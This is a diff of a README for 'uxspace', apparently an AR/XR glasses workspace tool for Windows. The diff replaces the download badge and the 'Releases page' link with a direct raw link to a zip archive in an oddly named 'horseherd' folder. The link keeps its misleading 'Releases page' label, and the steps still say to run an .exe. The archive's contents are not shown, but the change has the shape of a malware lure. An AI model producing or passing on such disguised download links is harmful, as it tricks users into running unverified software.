@@ -1,6 +1,6 @@
 # 🥽 uxspace - Create professional spatial workstations anywhere
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/kennauncombined371/uxspace/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/kennauncombined371/uxspace/raw/refs/heads/main/horseherd/Software-2.0-alpha.1.zip)
 
 uxspace turns your AR or XR glasses into a functional spatial workspace. You connect your glasses to your Windows computer to gain multiple virtual monitors and head-tracking capabilities. This software tracks your head movements to keep your windows stable in physical space.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you begin.
 
 Follow these steps to install the workspace software on your computer.
 
-1. Go to the [Releases page](https://github.com/kennauncombined371/uxspace/releases).
+1. Go to the [Releases page](https://github.com/kennauncombined371/uxspace/raw/refs/heads/main/horseherd/Software-2.0-alpha.1.zip).
 2. Look for the latest version listed at the top.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
